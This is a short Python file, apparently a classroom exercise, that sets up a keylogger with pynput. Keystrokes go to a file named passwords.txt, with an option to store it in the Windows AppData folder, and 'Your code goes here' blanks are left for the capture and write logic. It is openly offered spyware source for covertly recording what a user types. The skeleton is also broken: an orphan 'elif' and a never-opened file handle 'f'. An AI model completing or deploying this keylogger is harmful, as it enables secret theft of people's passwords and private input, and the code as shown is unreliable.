import os
from pynput.keyboard import Listener
keys = []
count = 0
#file_to_write = os.environ['appdata'] + '\\passwords.txt'    # for running on Windows
file_to_write = 'passwords.txt'      # for running on Linux and Mac
def on_press(key):
    global keys, count
    ## append key to keys
    ## increment count by 1
    ## if count >=1, reset count, call the write_file function, pass keys as parameter
    ## reset keys
    ## ----------
    ## Your code goes here
    ## -----------
def write_file(keys):
    ## open file_to_write in append mode
        for key in keys:
            k = str(key).replace("'", " ")
            ## replace backspace with 'Backspace'
            ## replace enter with "\n"
            ## relace shift with "Shift"
            ## replace space with ' '
            ## replace caps_lock with 'Caps Lock'
            ## ----------
            ## Your code goes here
            ## -----------
            elif k.find('key'):
                f.write(k)
with Listener(on_press=on_press) as listener:
    listener.join()